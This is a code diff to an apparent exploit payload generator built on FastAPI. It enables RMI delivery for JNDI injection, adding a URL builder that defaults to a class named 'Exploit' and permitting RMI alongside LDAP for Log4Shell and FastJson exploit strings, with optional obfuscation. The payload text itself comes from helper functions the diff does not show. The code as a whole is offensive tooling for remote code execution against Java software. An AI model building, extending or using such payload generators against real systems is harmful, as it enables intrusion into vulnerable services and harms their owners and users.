@@ -87,18 +87,18 @@ async def generate_payload(
         return PayloadResponse(type=chain_id, content_type="text/plain", value=url)
 
     if chain_id == "jndi_rmi_basic":
-        raise HTTPException(
-            status.HTTP_501_NOT_IMPLEMENTED,
-            "JNDI RMI delivery is not implemented; use jndi_ldap_basic instead.",
-        )
+        token = p.get("token") or body.token or ""
+        cn = p.get("class_name", "Exploit")
+        url = jb.jndi_rmi_url(token, s, cn)
+        return PayloadResponse(type=chain_id, content_type="text/plain", value=url)
 
     if chain_id == "exfil_log4j":
         token = p.get("token") or body.token or ""
         protocol = p.get("protocol", "ldap")
-        if protocol != "ldap":
+        if protocol not in ("ldap", "rmi"):
             raise HTTPException(
                 status.HTTP_501_NOT_IMPLEMENTED,
-                "Only ldap Log4Shell delivery is implemented; rmi/ldaps are not available.",
+                "Only ldap and rmi Log4Shell delivery are implemented.",
             )
         val = jb.log4shell_string(token, s, protocol, p.get("obfuscate", "none"))
         return PayloadResponse(type=chain_id, content_type="text/plain", value=val)
@@ -106,10 +106,10 @@ async def generate_payload(
     if chain_id == "exfil_fastjson":
         token = p.get("token") or body.token or ""
         protocol = p.get("ldap_or_rmi", "ldap")
-        if protocol == "rmi":
+        if protocol not in ("ldap", "rmi"):
             raise HTTPException(
-                status.HTTP_501_NOT_IMPLEMENTED,
-                "FastJson RMI JNDI delivery is not implemented; use ldap instead.",
+                status.HTTP_422_UNPROCESSABLE_ENTITY,
+                "protocol must be ldap or rmi.",
             )
         val = jb.fastjson_payload(token, s, protocol)
         return PayloadResponse(type=chain_id, content_type="application/json", value=val)
